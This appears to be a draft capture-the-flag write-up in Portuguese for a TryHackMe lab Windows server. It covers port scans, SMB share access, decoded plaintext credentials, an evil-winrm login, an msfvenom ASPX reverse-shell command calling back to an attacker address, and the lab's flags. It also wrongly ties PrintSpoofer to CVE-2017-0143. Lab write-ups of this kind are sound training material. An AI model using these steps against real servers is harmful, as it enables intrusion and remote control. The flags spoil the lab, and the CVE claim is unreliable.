@@ -1,0 +1,166 @@
+Esboço de relatorio (Informações gerais )
+
+
+Ao tentar acessar o endereço fornecido noto uma demora muito grande de resposta , fiz um teste em minha conexão e estava normal
+
+Port scan
+
+Nmap scan report for 10.10.78.248
+Host is up (0.36s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE        VERSION
+135/tcp  open  msrpc          Microsoft Windows RPC
+139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
+3389/tcp open  ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-10-03T14:09:48+00:00
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2021-10-02T14:06:42
+|_Not valid after:  2022-04-03T14:06:42
+|_ssl-date: 2021-10-03T14:10:28+00:00; +1m21s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1m20s, deviation: 0s, median: 1m19s
+|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+
+OBS:Por se tratar de um servidor windows ele roda a porta do servidor na porta 445 um smbclient 
+
+Sabendo a porta que o smb client funciona podemos exexutar um escript fornecido pelo proprio nmap que nos retorna a informação abaixo . 
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+
+
+Fazendo a enumeração de diretorios :
+Encontramos apenas :
+nt4wrksv  
+Ao colocar o diretorio encontrado na url fornecida não obtemos nenhuma resposta
+
+
+smbclient -L 10.10.78.248 
+Enter WORKGROUP\gabriel's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk      
+Dando o comando de listar encontramos alguns usuarios 
+
+Apos testar esses nomes o unico que possibilitou uma conexão com o servidor foi : nt4wrksv        
+
+executando o seguinte comando nos entramos no servidor : smbclient \\\\10.10.78.248\\nt4wrksv   
+
+executando um comando de listagen (l) encontrei um arquivo passwords.txt
+
+O arquivo mesmo contendo senhas como o nome indica , não uma proteção de nivel de usuario então foi possivel ler o arquivo com o nosso usario recem descoberto , foi possivel recolher as seguintes informações :
+
+
+	[User Passwords - Encoded]
+	Qm9iIC0gIVBAJCRXMHJEITEyMw==
+	QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+	/tmp/smbmore.aoRdBp (END)
+
+A primeira hash esta codificada em base 64 ao decodificar temos o seguinte resultado = Bob - !P@$$W0rD!123
+A segunda hash tambem estava em base 64 apesar de que quando usei hash identifer par a descobrir o tipo de hash ele retornou como sendo um possivel sha1 partindo desse pressuposto tentei decifrar como sendo sha1, sem sucesso ,apos um tempo pensei ja que a primeira estava em base64 por que a sengunda não . Lição : Nunca confie 100% em ferramentas verifique todas as possibilidades ate chegar ao resultado desejado 
+Segunda hash Bill - Juw4nnaM4n420696969!$$$
+
+Vamos tentar conectar com os usuarios que descobrimos usando o evil winrm 
+comando 
+evil winrm -i 10.10.78.248 -u bob -p '!P@$$W0rD!123'
+
+Depois de um longo tempo esperando um retorno, nada aconteceu , algo esta errado .
+
+Voltando o processo do inicio , refiz o port scan dessa vez abrangendo um grande numero de portas  
+
+
+comando : nmap -p 1-60000 -sC -sV -T4 10.10.180.86  
+Resultado : Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 13:36 -03
+Nmap scan report for 10.10.180.86
+Host is up (0.37s latency).
+Not shown: 59992 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-10-03T16:46:21+00:00
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2021-10-02T16:19:50
+|_Not valid after:  2022-04-03T16:19:50
+|_ssl-date: 2021-10-03T16:47:02+00:00; +1m21s from scanner time.
+49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h25m21s, deviation: 3h07m50s, median: 1m20s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-10-03T09:46:18-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-10-03T16:46:20
+|_  start_date: 2021-10-03T16:20:42
+
+49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) . Essa linha chama a atenção pois ele quer dizer que tem um segundo servidor rodando na porta 49663 (o desque se dá pelo numero da porta que é muito alto )
+
+Diferente do primeiro acesso a maquina com o ip normal quando acesso usando o segundo servidor é muito mais rápido .
+
+Ja que encontramos um segundo servidor em outra porta e ja fizemos a enumeração de diretorio vamos usar o diretorio anteriormente encontrado porém nessa nova porta  
+
+e deu certo temos respos,fazendo um teste para saber se é possivel o upload de arquivos por meio do smb que ganhamos acesso anteriormente , o teste foi positivo .
+
+comando para gerar a shell reversa em aspx (msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.90.85 LPORT=1234 -f -o shell.aspx
+)
+vamos obter nossa shell reversa
+
+usar vulnerabilidade do servidor windows 10 que permite ocasional escalonamento de privilegios
+
+flag de usuario THM{fdk4ka34vk346ksxfr21tg789ktf45}
+flag de root THM{1fk5kf469devly1gl320zafgl345pv}
+
+
+escalonamento de privilegios com printspoofer CVE-2017-0143 que permite um ocasional escalonamento de privilegios
+
